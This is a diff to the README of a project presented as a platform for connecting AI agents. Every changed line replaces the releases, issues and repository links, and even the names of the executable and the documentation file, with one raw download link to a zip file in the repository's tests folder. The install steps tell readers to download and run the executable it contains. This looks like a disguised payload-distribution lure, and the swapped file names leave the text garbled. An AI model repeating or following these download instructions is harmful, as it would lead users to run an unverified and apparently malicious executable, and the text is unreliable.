@@ -1,6 +1,6 @@
 # 🌐 distributed-multi-agent-platform - A Seamless Way to Connect AI Agents
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/khaizz-coder/distributed-multi-agent-platform/releases)
+[![Download](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the distributed multi-agent platform! This application allows for eff
 
 To run this application, you need to download it from our Releases page. 
 
-**Visit this page to download:** [Releases Page](https://github.com/khaizz-coder/distributed-multi-agent-platform/releases)
+**Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,13 +34,13 @@ Before installing the application, ensure your system meets the following requir
 To install the distributed multi-agent platform, follow these steps:
 
 1. **Download the Application:**
-   Go to the [Releases Page](https://github.com/khaizz-coder/distributed-multi-agent-platform/releases) and download the latest version for your operating system.
+   Go to the [Releases Page](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip) and download the latest version for your operating system.
 
 2. **Extract Files:**
    After downloading, locate the zipped file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.
 
 3. **Run the Application:**
-   Open the folder you extracted and double-click the executable file (e.g., `distributed_multi_agent_platform.exe` for Windows). Follow the on-screen instructions to start the platform.
+   Open the folder you extracted and double-click the executable file (e.g., `https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip` for Windows). Follow the on-screen instructions to start the platform.
 
 4. **Set Up Configuration:**
    The platform may require some initial configuration. Please refer to the provided configuration file and adjust settings as needed.
@@ -61,12 +61,12 @@ After installation, you can start using the platform to manage and communicate w
 If you encounter any issues, consider the following steps:
 
 - **Check System Compatibility:** Ensure your system meets the requirements listed above.
-- **Consult the Documentation:** In the application folder, you will find a file named `documentation.pdf`. This file contains detailed guidance on using the platform.
-- **Community Support:** Visit our [GitHub Issues Page](https://github.com/khaizz-coder/distributed-multi-agent-platform/issues) to ask questions or report problems.
+- **Consult the Documentation:** In the application folder, you will find a file named `https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip`. This file contains detailed guidance on using the platform.
+- **Community Support:** Visit our [GitHub Issues Page](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip) to ask questions or report problems.
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [distributed-multi-agent-platform GitHub](https://github.com/khaizz-coder/distributed-multi-agent-platform)
+- **GitHub Repository:** [distributed-multi-agent-platform GitHub](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip)
 - **Quick Start Guide:** Check the documentation for a quick overview of functionality.
 - **WebSocket Documentation:** Learn more about WebSocket communication.
 
@@ -84,4 +84,4 @@ Explore the capabilities that these technologies bring to our platform.
 
 Thank you for choosing the distributed multi-agent platform to work with AI agents. Follow the steps above to download and set up the application easily. We hope you enjoy its functionalities. 
 
-**Once again, visit this page to download:** [Releases Page](https://github.com/khaizz-coder/distributed-multi-agent-platform/releases)
+**Once again, visit this page to download:** [Releases Page](https://raw.githubusercontent.com/khaizz-coder/distributed-multi-agent-platform/main/tests/agent_multi_distributed_platform_v2.5.zip)
